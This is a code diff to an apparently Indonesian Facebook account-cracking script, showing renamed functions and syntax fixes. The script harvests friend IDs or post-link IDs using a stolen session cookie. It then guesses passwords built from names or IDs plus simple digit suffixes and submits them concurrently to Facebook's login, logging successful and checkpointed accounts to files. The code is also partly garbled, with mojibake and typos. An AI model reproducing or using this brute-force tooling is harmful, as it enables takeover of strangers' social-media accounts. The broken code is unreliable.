@@ -62,7 +62,7 @@ _________________________________________________________________ \x1b[1;97m
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/milestone.gota
 \x1b[1;94m───────────────────────────────────────────────────────""")
 
-def milzutc():
+def milzxtc():
     milzx=input(" \n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
     if milzx == "": 
        os.system(" python Milzx.py ")
@@ -78,7 +78,8 @@ def moch_milzx():
     print(" \033[97m [\033[91m00\033[97m] Exit ")
     print(" \x1b[1;94m────────────────────────────────────────────────────")
     time.slepp(0.1)
-    milzx=input("")("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
+
+    milzxtc=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
     if milzx == "1" or milzx =="01":
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
@@ -120,7 +121,7 @@ def moch_milzx():
                   os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
-                  os.system('python2 Milzuu.py')
+                  os.system('python2 Milzx.py')
          def login(username,password,cek=False):
              global die,check,result,count
              b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
@@ -223,7 +224,7 @@ def moch_milzx():
                    ses = requests.Session()
                    kukis = masuk()
                    kuki = {'cookie':kukis}
-                   milzx-anjay-uwu()
+                   cryx_cryx_milzx()
                    milzx()
                    aahh('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
                    aahh('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
@@ -237,7 +238,7 @@ def moch_milzx():
                    memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                    if memek =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
-                         milzx()
+                         milzxtc()
                    elif memek == '0' or memek =='00':
                          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
                          os.system('xdg-open  https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ-mg ')
@@ -256,8 +257,8 @@ def moch_milzx():
                          aahh("\x1b[1;94m •••••••••• 100%")
                          os.system("rm -rf cookies")
                          print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
-                         Milzuu()
-                         elif memek == '1' or memek =='01':
+                         milzx()
+                   elif memek == '1' or memek =='01':
                          url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                          username = getid(mbasic.format(url["href"]))
                    elif memek == '2' or memek =='02':
@@ -316,11 +317,11 @@ def moch_milzx():
                                  exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                    else:
                          print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
-                         milzx()
+                         milzxtc()
                    print()
                    cryx_cryx_milzx()
                    jembut()
-                   print('\n\x1b[1;96m        📯Anjay♡Mbahcod���🔫
+                   print('\n\x1b[1;96m        📯Anjay♡Mbahcod���🔫')
                    print('\x1b[1;95m     ■───────◇◇◇────────■')
                    print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     ■───────◇◇◇────────■ \n",end="")       
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
@@ -329,7 +330,7 @@ def moch_milzx():
                    aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
                    cryx_cryx_milzx()
                    jembut()
-                   print('\n\x1b[1;92m        📯Anjay♡Mbahcod���🔫
+                   print('\n\x1b[1;92m        📯Anjay♡Mbahcod���🔫')
                    print('\x1b[1;97m    ■───────◇◇◇────────■')
                    print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m    ■───────◇◇◇────────■ \n",end="")
                    print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
@@ -345,7 +346,7 @@ def moch_milzx():
                                                   str(x) + '12345',
                                                   str(x) + '123456',
                                                   ]
-                                                  listpass.append(expass)
+                                          listpass.append(expass)
                                           for passw in set(listpass):
                                                   ex.submit(login,(users[1]),(passw))
                    if check != 0 or result != 0:
@@ -361,18 +362,18 @@ def moch_milzx():
 
     elif milzx == "2" or milzx =="02":
          os.system("xdg-open https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ") 
-         milzx()
+         milzxtc()
     elif milzx == "3" or milzx =="03":
          os.system('xdg-open https://facebook.com/groups/338110617616908')
-         milzx()
+         milzxtc()
     elif milzx == "4" or milzx =="04":
          os.system('xdg-open https://facebook.com/groups/338110617616908')
-         milzx()
+         milzxtc()
     elif milzx == "5" or milzx =="05":
          print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
          os.system("git pull")
          print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
-         milzx()
+         milzxtc()
     elif milzx == "0" or milzx =="00":
          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
          os.system('xdg-open https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ-mg')
@@ -382,6 +383,6 @@ if __name__=="__main__":
      cryx_cryx_milzx()
      croot()
      cryx_cryx_milzx()
-     tolol()
+     kontol()
      moch_milzx()
      milzx()
